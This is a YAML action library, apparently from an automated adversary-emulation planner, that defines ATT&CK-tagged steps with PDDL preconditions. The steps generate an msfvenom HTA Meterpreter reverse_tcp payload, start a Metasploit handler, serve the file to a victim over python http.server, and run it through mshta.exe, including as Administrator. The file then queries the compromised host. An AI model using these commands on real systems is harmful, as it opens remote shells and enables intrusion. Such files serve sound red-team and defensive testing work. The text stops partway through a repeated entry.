attack_action_sequence:
  - uuid: msfvenom-hta
    name: Build the HTA (HTML Application) file of a Meterpreter session (for Windows)
      using MSFVenom
    id:
      - T1218.005
      - T1071.001
    source: Manual
    supported_platforms:
      - windows
    tactics:
      - Defense Evasion
      - Command and Control
    technique:
      - 'System Binary Proxy Execution: Mshta'
      - 'Application Layer Protocol: Web Protocols'
    description: |
      The command uses MSFVenom to generate an HTA (HTML Application) payload for a Meterpreter session. HTA files are opened by the Windows built-in `mshta.exe`, letting the payload run via a signed Microsoft binary (LOLBAS-style delivery). The `hta-psh` format wraps a PowerShell stager inside the HTA.
    execution:
      executor: MSFVenom Console
      command: |
        msfvenom -p windows/meterpreter/reverse_tcp LHOST=#{LHOST} LPORT=#{LPORT} -f hta-psh -o #{SAVE_PATH}
    arguments:
      LHOST:
        default:
        description: IP address of the attacker machine
        required: true
      LPORT:
        default:
        description: listening port of the attacker machine
        required: true
      SAVE_PATH:
        default:
        description: Saved path of the generated payload
        required: true
        pddl_index: string0_var_in_plan
    preconditions:
      - (os-windows ?target - host)
    effects:
      - (meterpreter-payload ?p - payload ?target - host)
      - (file-payload ?p - payload ?file - file)
      - (file-on-attacker ?path - string ?file - file)
      - (hta-file ?file - file)
  - uuid: set-msf-payload-handler-for-file
    name: Set an MSF payload handler for a file-backed payload
    id:
      - T1071.001
    source: Manual
    supported_platforms:
      - windows
    tactics:
      - Execution
      - Command and Control
    technique:
      - Windows Command Shell
      - Ingress Tool Transfer
      - Non-Standard Por
    description: |
      Same MSF `exploit/multi/handler` mechanism as `set-msf-payload-handler`, but
      for the case where the meterpreter payload has been (or will be) staged as a
      file on the victim.

      This variant additionally grants `(callback-covered ?file)` for the payload's
      file — the gate that every execute-* action requires before running that file.
      Payload-genesis actions (msfvenom) deliberately do NOT produce
      `callback-covered`, so payload files are born uncovered; firing this action
      is what makes them safe to execute. This forces the planner to sequence
      handler-set before any execute-* on the payload file — the ordering
      constraint is encoded directly in PDDL preconditions.

      Use `set-msf-payload-handler` (no file) for fileless delivery: reflective
      loading, in-memory shellcode injection, staged callback with no on-disk
      artifact.
    execution:
      executor: Metasploit Executor
      command: |
        exploit_and_execute_payload(exploit_module_name = "exploit/multi/handler",
                                    payload_module_name = "#{payload_name}",
                                    listening_host = "#{LHOST}",
                                    listening_port = "#{LPORT}"):
    arguments:
      LHOST:
        default:
        description: IP address of the attacker machine
        type:
      LPORT:
        default:
        description: listening port of the attacter machine
        type:
      payload_name:
        default:
        description: payload type set by msf
        type:
    preconditions:
      - (meterpreter-payload ?p - payload ?target - host)
      - (file-payload ?p - payload ?file - file)
    effects:
      - (payload-handler-set ?p - payload)
      - (callback-covered ?file - file)
  - uuid: simulate-download-file
    name: Simulate the victim download a file on its machine
    id:
      - T1566.002
    source: Manual
    supported_platforms:
      - windows
    tactics:
      - Initial Access
    technique:
      - 'Phishing: Spearphishing Link'
    description: This step simulates the victim accidentally downloads a malicious
      file by clicking a link.
    execution:
      executor: Human
      command: |
        (This step needs human interaction and (temporarily) cannot be executed automatically)
        (On attacker's machine)
        python -m http.server #{LPORT}

        (On victim's machine)
        1. Open #{LHOST}:#{LPORT} in the browser
        2. Navigate to the path of the file on the attacker's machine
        3. Download the file to #{SAVE_PATH}
    arguments:
      LHOST:
        default:
        description: IP address of the http file server (typically the attacker machine)
        type:
        required: true
      LPORT:
        default: 8000
        description: port of the http file server
        type:
        required: true
      SAVE_PATH:
        default:
        description: Saved path of the downloaded payload
        required: true
        pddl_index: string2_var_in_plan
    preconditions:
      - (allow-simulate-user-action ?target - host)
      - operator: or
        operands:
          - (os-linux ?target - host)
          - (os-windows ?target - host)
          - (os-macos ?target - host)
      - (file-on-attacker ?localpath - string ?file - file)
    effects:
      - (file-exists ?path - string ?file - file ?target - host)
  - uuid: simulate-execute-hta-windows
    name: Simulate the victim execute an HTA file on its machine
    id:
      - T1218.005
      - T1204.002
    source: Manual
    supported_platforms:
      - windows
    tactics:
      - Defense Evasion
      - Execution
    technique:
      - 'System Binary Proxy Execution: Mshta'
      - 'User Execution: Malicious File'
    description: |
      This step simulates the victim opening an HTA (HTML Application) file via the Windows built-in `mshta.exe`. Because `mshta.exe` is a signed Microsoft binary trusted by many application-allow-listing policies, the HTA vehicle is a classic LOLBAS execution path (T1218.005).
    execution:
      executor: Human
      command: |
        (This step needs human interaction and (temporarily) cannot be executed automatically)
        (On victim's machine, use PowerShell or Command Prompt, or the Run dialog)
        mshta.exe #{HTA_PATH}
    arguments:
      HTA_PATH:
        default:
        description: Saved path of the HTA file on the victim machine
        required: true
        pddl_index: string2_var_in_plan
    preconditions:
      - (allow-simulate-user-action ?target - host)
      - (os-windows ?target - host)
      - (file-exists ?path - string ?file - file ?target - host)
      - (hta-file ?file - file)
      - (callback-covered ?file - file)
    effects:
      - (file-executed ?file - file ?target - host)
  - uuid: execute-meterpreter-payload-file
    name: Execute a Meterpreter Payload
    id:
      - T1071.001
    source: Meterpreter
    supported_platforms:
      - windows
    tactics:
      - Command and Control
    technique:
      - Application Layer Protocol - Web Protocols
    description: |
      Executing a Meterpreter payload will establish a Meterpreter session.
    execution:
      executor: Meterpreter Session Establish
      command: |
        None
    arguments:
    preconditions:
      - (meterpreter-payload ?p - payload ?target - host)
      - (file-payload ?p - payload ?f - file)
      - (file-executed ?f - file ?target - host)
      - (payload-handler-set ?p - payload)
    effects:
      - (meterpreter-session ?s - executor ?target - host)
      - operator: When
        params:
          condition: (file-executed-elevated ?f - file ?target - host)
          effect: (elevated-executor ?s - executor)
  - uuid: meterpreter-getenv
    name: Retrieve Environment Variable
    id:
      - T1082
    source: Metasploit
    supported_platforms:
      - windows
      - linux
    tactics:
      - Discovery
    technique:
      - System Information Discovery
    description: The `getenv` command retrieves the value of an environment variable
      on the remote target.
    execution:
      executor: Meterpreter Executor
      command: getenv(var_name=#{name}, meterpreter_sessionid=#{executor})
    arguments:
      executor:
        description: The Meterpreter session ID of the active Metasploit connection.
        required: true
        pddl_index: executor2_var_in_plan
      name:
        description: Name of the environment variable to query
        required: true
    preconditions:
      - operator: or
        operands:
          - (os-windows ?target - host)
          - (os-linux ?target - host)
      - (meterpreter-session ?executorID - executor ?target - host)
    effects:
      - (system-information-info-known ?target - host)
  - uuid: simulate-execute-hta-windows-root
    name: Simulate the victim execute an HTA file on its machine as Admin
    id:
      - T1218.005
      - T1204.002
    source: Manual
    supported_platforms:
      - windows
    tactics:
      - Defense Evasion
      - Execution
    technique:
      - 'System Binary Proxy Execution: Mshta'
      - 'User Execution: Malicious File'
    description: |
      This step simulates the victim opening an HTA (HTML Application) file via `mshta.exe` **as Administrator** — either from an elevated Command Prompt / PowerShell, or by right-clicking `mshta.exe` and selecting "Run as administrator" and passing the HTA path. Because `mshta.exe` is a signed Microsoft binary, this is a LOLBAS-style elevated execution path (T1218.005).
    execution:
      executor: Human
      command: |
        (This step needs human interaction and (temporarily) cannot be executed automatically)
        (On victim's machine, open an ELEVATED PowerShell or Command Prompt)
        mshta.exe #{HTA_PATH}
    arguments:
      HTA_PATH:
        default:
        description: Saved path of the HTA file on the victim machine
        required: true
        pddl_index: string2_var_in_plan
    preconditions:
      - (allow-simulate-user-action ?target - host)
      - (os-windows ?target - host)
      - (file-exists ?path - string ?file - file ?target - host)
      - (hta-file ?file - file)
      - (callback-covered ?file - file)
    effects:
      - (file-executed-elevated ?file - file ?target - host)
  - uuid: execute-meterpreter-payload-file
    name: Execute a Meterpreter Payload
    id:
